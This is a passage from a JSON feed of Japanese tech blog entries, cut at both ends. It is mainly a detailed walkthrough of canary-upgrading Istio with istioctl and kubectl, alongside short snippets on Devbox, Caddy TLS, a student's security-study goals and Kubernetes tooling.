付けで退職したので、丸々 3 年間勤務したことになります。本当の意味での大規模 Kubernetes 環境で貴重な経験をさせて貰い感謝しかないです。記憶が新しい内に、この 3 年間でやってきたことを公開できる範囲で整理しました。 GitOps 風なマニフェスト管理への移行インフラチームで管理している監視ツールやアドオンなコンポーネントを Helm でインストールしていました。マルチクラスタな環境で手動インストールはスケールしないので、Helmfile で生成した各クラスタのマニフェストを Argo CD で同期する方式に...","isoDate":"2023-03-05T14:17:49.000Z","dateMiliSeconds":1678025869000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"放送コンテンツに対する ツイートの＜一様率＞分析","link":"https://speakerdeck.com/ota1022/fang-song-kontentunidui-suru-tuitono-yang-lu-fen-xi","contentSnippet":"DEIM2023 Day1 4a-3-2にて発表したスライドです。\\rhttps://event.dbsj.org/deim2023/","isoDate":"2023-03-05T05:00:00.000Z","dateMiliSeconds":1677992400000,"authorName":"Itaru Ota","authorId":"iota"},{"title":"Devbox を使った開発環境","link":"https://blog.1q77.com/2023/03/devbox/","contentSnippet":"ローカル環境を汚さずDockerコンテナのオーバーヘッドもなく、開発環境を自在に構築できる「Devbox 0.2.0」登場 － Publickeyこの記事を最初に見たときは「えーそんなのコンテナじゃないじゃん」とか思って不要じゃね？って思ってたんですが、Rails を少し触ることになって macOS 上での docker の遅さに辟易してきたので devbox を思い出し、使ってみることにしました。","isoDate":"2023-03-04T15:05:12.000Z","dateMiliSeconds":1677942312000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"ChatGPTのアルゴリズム","link":"https://speakerdeck.com/yunosukey/chatgptnoarukorisumu","contentSnippet":"ニューラルネット系自然言語処理の歴史を、アルゴリズムも紹介しながら単純パーセプトロンからChatGPTに至るまで辿る","isoDate":"2023-03-03T05:00:00.000Z","dateMiliSeconds":1677819600000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"【Istio⛵️】Istioを安全にアップグレードするカナリア方式とその仕組み","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2023/02/26/202548","contentSnippet":"この記事から得られる知識この記事を読むと、以下を \\"完全に理解\\" できます✌️Istioのアップグレード手法の種類について安全なカナリア方式の仕組みについてこの記事から得られる知識01. はじめに02. なぜ安全なアップグレードが必要なのか起こりうる問題採用するべきアップグレード手法03. アップグレード手法を説明する前にカナリアリリースとはカナリアリリースの手順(1) 新環境のリリース(2) 新環境への重み付けルーティング(3) 実地的テストの実施(4) 重み付けの段階的変更『カナリアリリース』の呼称の由来04. アップグレード手法の概要(1) アップグレード前の検証(2) 新Istiodのインストール(3) Webhookの宛先のServiceの変更(4) Istio IngressGatewayをインプレースアップグレード(5) 一部のNamespaceのistio-proxyコンテナをアップグレード(6) ユーザの手を借りたテスト(7) istio-proxyコンテナの段階的アップグレード(8) 旧Istiodのアンインストール05. アップグレード手法の詳細istioctl コマンドを使用したアップグレード前提NamespaceIstiodIstio IngressGatewayマイクロサービス(1) アップグレード前の検証ここで実施することistioctl x precheckコマンドkubectl getコマンド▼ IstiodのDeployment▼ Webhookの宛先のService▼ 宛先のServiceを決めるMutatingWebhookConfiguration(2) 新Istiodのインストールここで実施することistioctl versionコマンドistioctl installコマンドkubectl getコマンド▼ IstiodのDeployment▼ Webhookの宛先のService▼ Webhookの宛先のServiceを決めるMutatingWebhookConfiguration(3) Webhookの宛先のServiceの変更ここで実施することistioctl tag setコマンド(4) Istio IngressGatewayをインプレースアップグレードここで実施することkubectl rollout restartコマンド(5) 一部のNamespaceのistio-proxyコンテナをアップグレードここで実施することkubectl rollout restartコマンド(6) ユーザの手を借りたテストここで実施することもし問題が起こった場合(7) istio-proxyコンテナの段階的アップグレードここで実施することkubectl rollout restartコマンド(8) 旧Istiodのアンインストールここで実施することistioctl uninstallコマンドkubectl getコマンド▼ IstiodのDeployment▼ Webhookの宛先のService▼ 宛先のServiceを決めるMutatingWebhookConfiguration06. おわりに記事関連のおすすめ書籍01. はじめに隠しません。有吉弘行のサンデーナイトドリーマー は人生のバイブルです。さて、最近の業務でIstio⛵️をひたすらアップグレードしています。今回は、採用したアップグレード手法の紹介も兼ねて、Istioの安全なアップグレード手法の仕組みを記事で解説しました。Istioのアップグレード手法には変遷があり、解説するのは執筆時点 (2023/02/26) で最新の 1.14 系のアップグレード手法です。それでは、もりもり布教していきます\uD83D\uDE1702. なぜ安全なアップグレードが必要なのか起こりうる問題そもそも、なぜIstioで安全なアップグレードを採用する必要があるのでしょうか。Istioで問題が起こると、Pod内のistio-proxyコンテナが正しく稼働せず、システムに大きな影響を与える可能性があります。例えば、istio-proxyコンテナのPodへのインジェクションがずっと完了せず、アプリコンテナへの通信が全て遮断されるといったことが起こることがあります。採用するべきアップグレード手法執筆時点 (2023/02/26) では、Istiodコントロールプレーン (以降、Istiodとします) のアップグレード手法には、『インプレース方式』と『カナリア方式』があります。また合わせてアップグレードが必要なIstio IngressGatewayには、その手法に『インプレース方式』があります。今回の安全なアップグレード手法として、Istiodでは『カナリアアップグレード』、Istio IngressGatewayでは『インプレースアップグレード』を採用します。Istio / Canary UpgradesIstio / Installing Gateways03. アップグレード手法を説明する前にカナリアリリースとはIstiodのカナリアアップグレードが理解しやすくなるように、カナリアリリースから説明したいと思います。カナリアリリースは、実際のユーザーにテストしてもらいながらリリースする手法です。もしカナリアリリースをご存知の方は、 04. アップグレード手法の概要 まで飛ばしてください\uD83D\uDE47\uD83C\uDFFB‍カナリアリリースの手順カナリアリリースは、一部のユーザーを犠牲にすることになる一方で、アプリを実地的にテストできる点で優れています。手順を交えながら説明します。Canary Release(1) 新環境のリリース旧環境のアプリを残したまま、新環境をリリースします。この段階では、全てのユーザー (100%) を旧環境にルーティングします。(2) 新環境への重み付けルーティングロードバランサーで重み付けを変更し、一部のユーザー (ここでは10%) を新環境にルーティングします。(3) 実地的テストの実施ユーザーの手を借りて新環境を実地的にテストします (例：該当のエラーメトリクスが基準値を満たすか) 。(4) 重み付けの段階的変更新環境に問題が起こらなければ、重み付けを段階的に変更し、最終的には全てのユーザー (100%) を新環境にルーティングします。『カナリアリリース』の呼称の由来カナリアリリースについては、その呼称の由来を知ると、より理解が深まります。カナリアリリースは、20世紀頃の炭坑労働者の危機察知方法に由来します。炭鉱内には有毒な一酸化炭素が発生する場所がありますが、これは無色無臭なため、気づくことに遅れる可能性があります。そこで当時の炭鉱労働者は、一酸化炭素に敏感な『カナリア』を炭鉱内に持ち込み、カナリアの様子から一酸化炭素の存在を察知するようにしていたそうです。つまり、先ほどの『犠牲になる一部のユーザー』が、ここでいうカナリアというわけです\uD83D\uDE28画像引用元：George McCaa, U.S. Bureau of MinesAbout canary deployment in simple words04. アップグレード手法の概要カナリアリリースを理解したところで、Istioの安全なアップグレード手法の概要を説明します。おおよそ以下の手順からなります。なお各番号は、05. アップグレード手法の詳細 の (1) 〜 (8) に対応しています。(1) アップグレード前の検証旧Istiodが稼働しています。ここで、アップグレードが可能かどうかを検証しておきます。(2) 新Istiodのインストール新Istiod (discoveryコンテナ) をインストールします。(3) Webhookの宛先のServiceの変更新Istiodのistio-proxyコンテナをインジェクションできるように、Webhookの宛先のServiceを変更します。この手順は重要で、後の  (3) Webhookの宛先のServiceの変更 で詳細を説明しています。(4) Istio IngressGatewayをインプレースアップグレードIstio IngressGatewayをインプレースアップグレードします。(5) 一部のNamespaceのistio-proxyコンテナをアップグレード一部のNamespaceで、istio-proxyコンテナをカナリアアップグレードします。▶︎ 『カナリアアップグレード』の呼称についてistio-proxyコンテナを一斉にアップグレードするのではなく、段階的にアップグレードしていく様子を『カナリア』と呼称している、と個人的に推測しています。もし『カナリアアップグレード』の由来をご存じの方は、ぜひ教えていただけると\uD83D\uDE47\uD83C\uDFFB‍(6) ユーザの手を借りたテストユーザーの手を借りて、実地的にテストします (例：該当のエラーメトリクスが基準値以下を満たすか) 。(7) istio-proxyコンテナの段階的アップグレード新Istiodのistio-proxyコンテナに問題が起こらなければ、他のNamespaceでもistio-proxyコンテナを段階的にカナリアアップグレードしていきます。一方でもし問題が起これば、Namespaceのistio-proxyコンテナとIstio IngressGatewayをダウングレードします。(8) 旧Istiodのアンインストール最後に、旧Istiodをアンインストールします。Istio / Canary Upgrades05. アップグレード手法の詳細istioctl コマンドを使用したアップグレードここからは、04. アップグレード手法の概要 を深ぼっていきます。今回は、ドキュメントで一番優先して記載されている istioctl コマンドを使用した手順 を説明します。なお各番号は、04. アップグレード手法の概要 の (1) 〜 (8) に対応しています。▶︎ アップグレードに使用するツールについてistioctlコマンド以外のツール (例：helmコマンド、helmfileコマンド、ArgoCD) を使用してもアップグレードできます。細かな手順が異なるだけで、アップグレード手法の概要は同じです\uD83D\uDE46\uD83C\uDFFB‍前提Namespaceまず最初に、前提となる状況を設定しておきます。各Namespaceのistio.io/revラベルにdefaultが設定されているとします。$ kubectl get namespace -L istio.io/revNAME              STATUS   AGE   REVfoo               Active   34d   defaultbar               Active   34d   defaultbaz               Active   34d   defaultistio-ingress     Active   34d   default...▶︎ istio.io/revラベル値のエイリアスについてistio.io/revラベル値は、どんなエイリアスでもよいです。よくあるエイリアスとしてdefaultやstableを使用します\uD83D\uDC4Dさらに、マニフェストに書き起こすと以下のようになっています。apiVersion: v1kind: Namespacemetadata:  name: foo  labels:    istio.io/rev: defaultこのistio.io/revラベルがあることにより、そのNamespaceのPodにistio-proxyコンテナを自動的にインジェクションします。▶︎ istio-proxyコンテナのインジェクションの仕組みについてについてistio-proxyコンテナのインジェクションの仕組みについては、今回言及しておりません。以下の記事で解説していますため、もし気になる方はよろしくどうぞ\uD83D\uDE47\uD83C\uDFFB‍Istiodすでに1-14-6のIstiodが動いており、1-15-4にカナリアアップグレードします。IstiodはDeployment配下のPodであり、このPodはIstiodの実体であるdiscoveryコンテナを持ちます。$ kubectl get deployment -n istio-system -l app=istiodNAME                   READY   UP-TO-DATE   AVAILABLE   AGEistiod-1-14-6          1/1     1            1           47s # 1-14-6Istio IngressGatewayIstio IngressGatewayはIstiodとは異なるNamespaceで動いており、インプレースアップグレードします。Istio IngressGatewayはistio-proxyコンテナを持ちます。$ kubectl get deployment -n istio-ingressNAME                   READY   UP-TO-DATE   AVAILABLE   AGEistio-ingressgateway   1/1     1            1           47s▶︎ IstiodとIstio IngressGatewayを動かすNamespaceについてIstio / Installing Gatewaysマイクロサービス各Namespaceでマイクロサービスが動いています。マイクロサービスのPodはistio-proxyコンテナを持ちます。$ kubectl get deployment -n fooNAME   READY   UP-TO-DATE   AVAILABLE   AGEfoo    2/2     1            1           47s...$ kubectl get deployment -n barNAME   READY   UP-TO-DATE   AVAILABLE   AGEbar    2/2     1            1           47s..$ kubectl get deployment -n bazNAME   READY   UP-TO-DATE   AVAILABLE   AGEbaz    2/2     1            1           47s...(1) アップグレード前の検証ここで実施することアップグレード前に、現在のKubernetes Clusterがアップグレード要件を満たしているかを検証します。Before you upgradeistioctl x precheckコマンドistioctl x precheckコマンドを実行し、アップグレード要件を検証します。問題がなければ、istioctlコマンドはNo issue ...の文言を出力します。$ istioctl x precheck✅ No issues found when checking the cluster.Istiois safe to install or upgrade!  To get started, check out https://istio.io/latest/docs/setup/getting-started/▶︎ アップグレード要件が満たない場合についてistioctl x precheckコマンドはエラー文言を出力します。例えば、Istioのistio-proxyコンテナのインジェクションではkube-apiserverと通信する必要があります。そのため、kube-apiserverのバージョンが古すぎるせいでIstioが非対応であると、エラーになります\uD83D\uDE2Dkubectl getコマンド▼ IstiodのDeploymentkubectl getコマンドを実行し、現在のIstiodのバージョンを確認します\uD83D\uDC40まずはIstiodのDeploymentを確認すると、1-14-6のDeploymentがあります。$ kubectl get deployment -n istio-system -l app=istiodNAME                   READY   UP-TO-DATE   AVAILABLE   AGEistiod-1-14-6          1/1     1            1           47s # 1-14-6istio-proxyコンテナのインジェクションの仕組みでいうと、以下の赤枠の要素です\uD83D\uDC47▼ Webhookの宛先のService次に、 Serviceを確認すると、1-14-6のServiceがあります。$ kubectl get service -n istio-system -l app=istiodNAME            TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)                                 AGEistiod-1-14-6   ClusterIP   10.96.93.151     <none>        15010/TCP,15012/TCP,443/TCP,15014/TCP   109s # 1-14-6このServiceは、kube-apiserverからIstiodへのWebhookを仲介することにより、istio-proxyコンテナのインジェクションを可能にします。istio-proxyコンテナのインジェクションの仕組みでいうと、以下の赤枠の要素です\uD83D\uDC47▼ 宛先のServiceを決めるMutatingWebhookConfiguration最後に、MutatingWebhookConfigurationを確認すると、istio-revision-tag-<エイリアス>とistio-sidecar-injector-<リビジョン番号>のMutatingWebhookConfigurationがあります。$ kubectl get mutatingwebhookconfigurationsNAME                            WEBHOOKS   AGEistio-revision-tag-default      2          114s  # カナリアアップグレード用istio-sidecar-injector-1-14-6   2          2m16s # インプレースアップグレード用のため今回は言及しないistio-proxyコンテナのインジェクションの仕組みでいうと、以下の赤枠の要素です\uD83D\uDC47これらのうち、前者 (istio-revision-tag-<エイリアス>) をカナリアアップグレードのために使用します。このMutatingWebhookConfigurationは、Webhookの宛先のServiceを決めるため、結果的にistio-proxyコンテナのバージョンを決めます。ここで、MutatingWebhookConfigurationのistio.io/revラベルとistio.io/tagラベルの値も確認しておきます。$ kubectl get mutatingwebhookconfiguration istio-revision-tag-default -o yaml \\\\    | yq \'.metadata.labels\'...istio.io/rev: 1-14-6istio.io/tag: default...istio.io/revラベルはIstiodのバージョン、istio.io/tagラベルはこれのエイリアスを表しています。また、.webhooks[].namespaceSelectorキー配下のistio.io/revキーの検知ルールを確認します。$ kubectl get mutatingwebhookconfiguration istio-revision-tag-default -o yaml \\\\    | yq \'.webhooks[]\'...namespaceSelector:  matchExpressions:    - key: istio.io/rev      operator: In      values:        - default...合わせて、.webhooks[].clientConfig.serviceキー配下のServiceを名前を確認します。$ kubectl get mutatingwebhookconfiguration istio-revision-tag-default -o yaml \\\\    | yq \'.webhooks[].clientConfig\'...service:  name: istiod-1-14-6...▶︎ MutatingWebhookConfigurationの役割についてistio.io/revラベルにdefaultを設定してあるとします。すると、上記のMutatingWebhookConfigurationがこれを検知します。MutatingWebhookConfigurationにはdefaultに対応するIstioのリビジョンが定義されており、kube-apiserverが特定のIstioのバージョンのServiceにWebhookを送信可能になります\uD83C\uDF89Istio / Safely upgrade the Istio control plane with revisions and tags(2) 新Istiodのインストールここで実施することそれでは、新Istiodをインストールします。Control planeistioctl versionコマンド新しくインストールするIstiodのバージョンは、istioctlコマンドのバージョンで決まります。そこで、istioctl versionコマンドを実行し、これのバージョンを確認します。$ istioctl versionclient version: 1.15.4        # アップグレード先のバージョンcontrol plane version: 1.14.6 # 現在のバージョンdata plane version: 1.14.6istioctl installコマンドカナリアアップグレードの場合、istioctl installコマンドを実行します。ドキュメントではrevisionキーの値がcanaryですが、今回は1-15-4とします。この値は、Istioが使用する様々なKubernetesリソースの接尾辞や、各リソースのistio.io/revラベルの値になります。$ istioctl install --set revision=1-15-4WARNING: Istio is being upgraded from 1.14.6 -> 1.15.4WARNING: Before upgrading, you may wish to use \'istioctl analyze\' to check for IST0002 and IST0135 deprecation warnings.✅ Istio core installed✅ Istiod installed✅ Ingress gateways installed✅ Installation completeThank you for installing Istio 1.15.  Please take a few minutes to tell us about your install/upgrade experience!▶︎ カナリアアップグレードで指定できるバージョン差についてrevisionキーを使用したカナリアアップグレードでは、2つの先のマイナーバージョンまでアップグレードできます。例えば、現在のIstioが1.14.6であるなら、1.16系まで対応しています\uD83D\uDC4DIstio / Canary Upgradeskubectl getコマンド▼ IstiodのDeploymentkubectl getコマンドを実行し、istioctl installコマンドで何をインストールしたのかを確認します\uD83D\uDC40まずはIstiodのDeploymentを確認すると、1-15-4というDeploymentが新しく増えています。$ kubectl get deployment -n istio-system -l app=istiodNAME            READY   UP-TO-DATE   AVAILABLE   AGEistiod-1-14-6   1/1     1            1           47s # 1-14-6istiod-1-15-4   1/1     1            1           47s # 1-15-4接尾辞の1-15-4は、revisionキーの値で決まります。この段階では、旧Istiodと新Istioが並行的に稼働しており、kube-apiserverはまだ旧Istiodと通信しています今の状況は以下の通りです\uD83D\uDC47▼ Webhookの宛先のService次に Webhookの宛先のServiceを確認すると、istiod-1-15-4というServiceが新しく増えています。$ kubectl get service -n istio-system -l app=istiodNAME            TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)                                 AGEistiod-1-14-6   ClusterIP   10.96.93.151     <none>        15010/TCP,15012/TCP,443/TCP,15014/TCP   109s # 1-14-6istiod-1-15-4   ClusterIP   10.104.186.250   <none>        15010/TCP,15012/TCP,443/TCP,15014/TCP   87s  # 1-15-4この段階では、まだWebhookの宛先はistiod-1-14-6のServiceです。今の状況は以下の通りです\uD83D\uDC47▼ Webhookの宛先のServiceを決めるMutatingWebhookConfiguration最後にMutatingWebhookConfigurationを確認すると、istio-sidecar-injector-1-15-4というMutatingWebhookConfigurationが新しく増えています。$ kubectl get mutatingwebhookconfigurationsNAME                            WEBHOOKS   AGEistio-revision-tag-default      2          114s  # カナリアアップグレードで使用するistio-sidecar-injector-1-14-6   2          2m16sistio-sidecar-injector-1-15-4   2          2m16sカナリアアップグレードでは、istio-revision-tag-<エイリアス>のMutatingWebhookConfigurationを使用します。今の状況は以下の通りです\uD83D\uDC47▶︎ アンインストールについて(3) Webhookの宛先のServiceの変更ここで実施することこの手順では、エイリアスのistio.io/tagラベルの値はそのままにしておき、一方でistio.io/revラベルの値を変更します。さらに、Webhookの宛先のServiceを変更します。Default tagSafely upgrade the Istio control plane with revisions and tagsistioctl tag setコマンドistioctl tag setコマンドを実行し、istio.io/revラベルの値と宛先のServiceを変更します。$ istioctl tag set default --revision 1-15-4 --overwrite実行後に、もう一度MutatingWebhookConfigurationを確認すると、istio.io/revラベルの値が変わっています。$ kubectl get mutatingwebhookconfiguration istio-revision-tag-default -o yaml \\\\    | yq \'.metadata.labels\'...istio.io/rev: 1-15-4istio.io/tag: default...また、Webhookの宛先のServiceも変わっています。$ kubectl get mutatingwebhookconfiguration istio-revision-tag-default -o yaml \\\\    | yq \'.webhooks[].clientConfig\'...service:  name: istiod-1-15-4...これらにより、Webhookの宛先が 1-15-4 のService となります。そのため、 1-15-4 の istio-proxy コンテナをインジェクションできる ようになります。今の状況は以下の通りです\uD83D\uDC47(4) Istio IngressGatewayをインプレースアップグレードここで実施することWebhookの宛先が1-15-4のServiceに変わったところで、Istio IngressGatewayをインプレースアップグレードします。In place upgradekubectl rollout restartコマンドkubectl rollout restartコマンドを実行し、Istio IngressGatewayをインプレースアップグレードします。$ kubectl rollout restart deployment istio-ingressgateway-n istio-ingress再作成したPodのイメージを確認してみると、istio-proxyコンテナを1-15-4にアップグレードできています。$ kubectl get pod bar -n bar -o yaml | yq \'.spec.containers[].image\'docker.io/istio/proxyv2:1.15.4 # istio-proxyコンテナ▶︎ istioctl proxy-statusコマンドについてkubectl getコマンドの代わりに、istioctl proxy-statusコマンドを使用して、アップグレードの完了を確認してもよいです。今の状況は以下の通りです\uD83D\uDC47▶︎ Istio IngressGatewayの通信遮断について(5) 一部のNamespaceのistio-proxyコンテナをアップグレードここで実施すること続けて、一部のNamespaceのistio-proxyコンテナをアップグレードします。Podの再作成により、新Istiodのistio-proxyコンテナがインジェクションされるため。istio-proxyコンテナをアップグレードできます。Data planekubectl rollout restartコマンド前提にあるように、Namespaceには foo bar baz があります。kubectl rollout restartコマンドを実行し、barのistio-proxyコンテナからアップグレードします。$ kubectl rollout restart deployment bar -n bar再作成したPodのイメージを確認してみると、istio-proxyコンテナを1-15-4にアップグレードできています。$ kubectl get pod bar -n bar -o yaml | yq \'.spec.containers[].image\'bar-app:1.0 # マイクロサービスdocker.io/istio/proxyv2:1.15.4 # istio-proxyコンテナ▶︎ istioctl proxy-statusコマンドについてkubectl getコマンドの代わりに、istioctl proxy-statusコマンドを使用して、アップグレードの完了を確認してもよいです。今の状況は以下の通りです\uD83D\uDC47(6) ユーザの手を借りたテストここで実施することIstioを部分的にアップグレードしたところで、アップグレードが完了したNamespaceをテストします。ユーザーの手を借りて実地的にテストします (例：該当のエラーメトリクスが基準値を満たすか) 。今の状況は以下の通りです\uD83D\uDC47もし問題が起こった場合もし問題が起こった場合、1-14-6にダウングレードしていきます。istioctl tag setコマンドを実行し、istio.io/revラベルの値を元に戻します。$ istioctl tag set default --revision 1-14-6 --overwriteその後、kubectl rollout restartコマンドの手順を実行し、istio-proxyコンテナをダウングレードしてきます。(7) istio-proxyコンテナの段階的アップグレードここで実施すること先ほどのNamespaceで問題が起こらなければ、残ったNamespace (foo、baz、...) のistio-proxyコンテナも段階的にアップグレードしていきます。kubectl rollout restartコマンド同様にkubectl rollout restartコマンドを実行し、istio-proxyコンテナからアップグレードします。$ kubectl rollout restart deployment foo -n foo$ kubectl rollout restart deployment baz -n baz...最終的に、全てのNamespacemのistio-proxyコンテナが新しくなります。今の状況は以下の通りです\uD83D\uDC47(8) 旧Istiodのアンインストールここで実施すること最後に、旧Istiodのアンインストールします。Uninstall old control planeistioctl uninstallコマンドistioctl uninstallコマンドを実行し、旧Istiodをアンインストールします。$ istioctl uninstall --revision 1-14-6✅ Uninstall complete今の状況は以下の通りです\uD83D\uDC47kubectl getコマンド▼ IstiodのDeploymentkubectl getコマンドを実行し、istioctl uninstallコマンドで何をアンインストールしたのかを確認します\uD83D\uDC40まずはIstiodのDeploymentを確認すると、1-14-6というDeploymentが無くなっています。$ kubectl get deployment -n istio-system -l app=istiodNAME            READY   UP-TO-DATE   AVAILABLE   AGEistiod-1-15-4   1/1     1            1           47s # 1-15-4▼ Webhookの宛先のService次に Webhookの宛先のServiceを確認すると、istiod-1-14-6というServiceが無くなっています。$ kubectl get service -n istio-system -l app=istiodNAME            TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)                                 AGEistiod-1-15-4   ClusterIP   10.104.186.250   <none>        15010/TCP,15012/TCP,443/TCP,15014/TCP   87s  # 1-15-4▼ 宛先のServiceを決めるMutatingWebhookConfiguration最後にMutatingWebhookConfigurationを確認すると、istio-sidecar-injector-1-14-6というMutatingWebhookConfigurationが無くなっています。$ kubectl get mutatingwebhookconfigurationsNAME                            WEBHOOKS   AGEistio-revision-tag-default      2          114s  # 次のカナリアアップグレードでも使用するistio-sidecar-injector-1-15-4   2          2m16sこれで、新Istiodに完全に入れ替わったため、アップグレードは完了です。今の状況は以下の通りです\uD83D\uDC47▶︎ アンインストールについて06. おわりにIstioを安全にアップグレードするカナリア方式とその仕組みをもりもり布教しました。Istioへの愛が溢れてしまいました。これからIstioを採用予定の方は、Istioを安全にアップグレードするために十分に準備しておくことをお勧めします\uD83D\uDC4D記事関連のおすすめ書籍Istio in Action (English Edition)作者:Posta, Christian E.,Maloku, RinorManningAmazonIstio: Up and Running: Using a Service Mesh to Connect, Secure, Control, and Observe作者:Calcote, Lee,Butcher, ZackO\'Reilly MediaAmazon","isoDate":"2023-02-26T11:25:48.000Z","dateMiliSeconds":1677410748000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"LINE に送ったメッセージを Google Home に読み上げさせる","link":"https://blog.1q77.com/2023/02/line-bot-tts/","contentSnippet":"令和の時代、家に固定電話はなく、外出先から家族に直ぐに答えて欲しいことがあってもスマホはマナーモードで手元に置いてなければ気づくことができません。","isoDate":"2023-02-25T12:51:58.000Z","dateMiliSeconds":1677329518000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Caddy の Internal TLS 証明書の有効期間を指定する","link":"https://blog.1q77.com/2023/02/caddy-internal-tls-cert-lifetime/","contentSnippet":"以前 ワンライナーで https の Reverse Proxy を実行する という記事で Caddy を使うと local での開発用に任意のドメインの証明書を簡単に発行できるし CA の証明書も OS の証明書ストアに保存してくれるため、ブラウザでアクセスしても警告が出なくて便利というのを書きました。","isoDate":"2023-02-09T14:29:32.000Z","dateMiliSeconds":1675952972000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"2023年の目標","link":"https://moz-security.hatenablog.com/entry/2023/02/01/112627","contentSnippet":"前回のブログで「近々、新年の抱負として、今年やりたいことを書きたいと思っています。」と書いておきながら、もう少しで１ヶ月が経ってしまいます。（近々とは？って感じですけど 笑）１月は、大学のテストと溜まりに溜まった課題で手一杯でしたが、1月31日でそれも終わり、ひと段落したため、今年の目標について書いていこうと思います。目標は大きく4つあります。1つ目は、大学の研究です。これは目標というよりも、頑張ることになってますね。どれだけ独学で勉強しても、趣味でいろいろシステム開発しても、まずは大学を卒業しなければ、学士にはなれないため、これは間違いなく最優先で行わなければいけません。大学の授業としても、あと残っているのが卒業研究だけであるため、今年大学でやること・頑張ることはこれだけかなと思います。大学に行って、ひたすら研究、研究、研究になる気がします。2つ目は、Hack The BoxでHackerランクになることです。昨年の3月ごろからHack The Boxを始めて、時間があるときに取り組んでいましたが、Starting Pointのいろいろな箇所で詰まったり、そもそも時間を十分に取れなかったりして、あまり攻略できていませんでした。今年は、授業もあまりなく、時間も取れそうなため、本腰を入れて頑張りたいと思います。具体的な数字でいうと、少なくとも毎日１時間、朝８時〜９時までをHack The Boxを攻略する時間に当てようと思っています。理想は、2時間、3時間、時間が取れるならそれよりもという感じなんですけど、日によっては、忙しい日もあるので、そんな日でも取れそうな最低限の1時間にしました。こういうのは1日に頑張りすぎるよりも、継続することが大事だと思うので、毎日コツコツやっていきたいと思います。将来的にはセキュリティ関連の仕事をしたいため、攻撃を通して防御を学び、防御を通して攻撃を学んでいきたいと思います。3つ目は、資格の取得です。今まで、基本情報技術者、応用情報技術者を取ってきたため、今年は、情報処理安全確保支援士に挑戦したいと思っています。資格は、知識問題でしかないから、社会では使えないという意見もあり、自分でも知識(知っていること) とスキル(できること)は違うと思っているため、半分は同意できるのですが、一方で、資格を取るために勉強するというこの資格を取るまでの過程が大事だとも思っています。また、幅広く体系的な知識を習得できるというのも資格取得のメリットだと思っています。情報処理安全確保支援士取得に向けて、これから頑張りたいと思います。4つ目は、学外のイベントに参加することです。セキュリティキャンプやSecHack365といったセキュリティ関連のイベントに加え、ハッカソンやカンファレンスにも参加していきたいと思っています。前までは、自分のスキルでは学外イベントに参加するのは恥ずかしいと思い、挑戦できていなかったのですが、昨年、ハッカソンやセキュリティ・ミニキャンプに参加することで、参加する人全員がすごい人ではなく、自分と似たような人もいるし、イベントを通して、成長したいという人がたくさんいることも知りました。今年は、昨年に引き続き、より多くのイベントに参加し、成長できる環境に自分から臨んでいきたいと思います。1月も終わり、今年もあと11ヶ月になりましたが、いろいろな経験をして、たくさんの人に出会い、成長できたと言える1年にしていきたいと思います。","isoDate":"2023-02-01T02:26:27.000Z","dateMiliSeconds":1675218387000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"GitLabで指定したグループ内の全てのリポジトリを一括でcloneする","link":"https://zenn.dev/tayusa/articles/ae5911391c9440","contentSnippet":"概要1個1個丹精込めて手動でcloneすることに限界を感じたので、一括で自分に関連するリポジトリをcloneする シェルスクリプト.zshrc# リポジトリのディレクトリを作成してからcloneする# 第1引数 URL(https://gitlab.example.com/diaspora/diaspora-client.git)function git_clone_to_path() {  [[ -z ${commands[git]} ]] \\\\    && { echo \'git is required\'; return 1; }  loca...","isoDate":"2023-01-29T17:07:31.000Z","dateMiliSeconds":1675012051000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"ArtifactHUBについてのメモ","link":"https://zenn.dev/bells17/articles/artifacthub-note","contentSnippet":"ArtifactHUB というコンテナイメージHelm Chartなどを登録・検索することのできるツールを試してみたのでメモ。https://artifacthub.io/ ArtifactHUB についてコンテナイメージHelm Chartなどを「リポジトリ」として登録・検索することができるよう。登録できるリポジトリの種類は下記で確認できる。https://artifacthub.io/docs/topics/repositories/アカウント登録方法は現在下記の3つがあるemailgithubgoogle リポジトリの登録リポジトリ登...","isoDate":"2023-01-21T18:21:58.000Z","dateMiliSeconds":1674325318000,"authorName":"bells17","authorId":"bells17"},{"title":"container-structure-testによるコンテナのテスト","link":"https://zenn.dev/bells17/articles/container-structure-test","contentSnippet":"Googleが作成しているcontainer-structure-testというコンテナをテストするツールを試したのでメモ。かなり単純なツールなのでぶっちゃけREADMEに書いてあることを読めばわかるんだけど一応情報をまとめた。https://github.com/GoogleContainerTools/container-structure-testGoogleのブログで紹介されている記事はこちら。https://opensource.googleblog.com/2018/01/container-structure-tests-unit-tests.html cont...","isoDate":"2023-01-21T10:54:17.000Z","dateMiliSeconds":1674298457000,"authorName":"bells17","authorId":"bells17"},{"title":"【Istio⛵️】サービスメッシュの登場経緯とIstioサイドカーインジェクションの仕組み","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2023/01/14/223815","contentSnippet":"この記事から得られる知識この記事を読むと、以下を \\"完全に理解\\" できます✌️代表的なサービスメッシュの種類についてIstioのサイドカーインジェクションの仕組みについてこの記事から得られる知識01. はじめに02. サービスメッシュが登場した経緯なぜサービスメッシュが登場したのかサービスメッシュのモデルサイドカープロキシメッシュ03. admission-controllersアドオンについてadmission-controllersアドオンとはadmissionプラグインの種類MutatingAdmissionWebhookプラグインMutatingAdmissionWebhookプラグインとはAdmissionReview、AdmissionRequest、AdmissionResponse▼ AdmissionReview▼ AdmissionRequest▼ AdmissionResponse04. サイドカーインジェクションの仕組み全体のフロークライアント ➡︎ kube-apiserverここで説明するフロー箇所(1) Podの作成をリクエストkube-apiserver ➡︎ Serviceここで説明するフロー箇所(2) 認証/認可処理をコール(3) アドオンの処理をコール(4) AdmissionRequestに値を詰める(5) AdmissionReviewを送信Service ➡︎ webhookサーバーここで説明するフロー箇所(6) 15017番ポートにポートフォワーディングkube-apiserver ⬅︎ Service ⬅︎ webhookサーバー (※逆向きの矢印)ここで説明するフロー箇所(7) patch処理を定義(8) AdmissionResponseに値を詰める(9) AdmissionReviewを返信kube-apiserver ➡︎ 